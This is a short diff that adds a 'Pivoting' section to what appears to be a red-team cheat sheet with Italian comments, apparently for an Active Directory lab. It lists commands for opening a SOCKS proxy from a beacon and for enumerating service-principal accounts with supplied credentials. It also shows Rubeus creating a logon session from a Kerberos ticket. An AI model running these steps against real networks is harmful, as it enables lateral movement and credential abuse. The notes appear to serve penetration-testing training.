@@ -1002,3 +1002,25 @@ powerpick Get-DomainTrust
 ##########################################
 
 ```
+
+
+## Pivoting
+
+```bash
+#Avvio socksProxy
+beacon> socks 1080
+
+#tool Proxifier
+
+#Autenticazione proxy:
+#plaintest
+$Cred = Get-Credential CONTOSO.COM\rsteel
+Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server lon-dc-1
+
+#Kerberos Tickets (.kirbi) + Rubeu
+Rubeus.exe createnetonly /username:rsteel /password:FakePass /ticket:rsteel.kirbi /show
+
+ipmo ActiveDirectory
+Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server lon-dc-1
+
+```
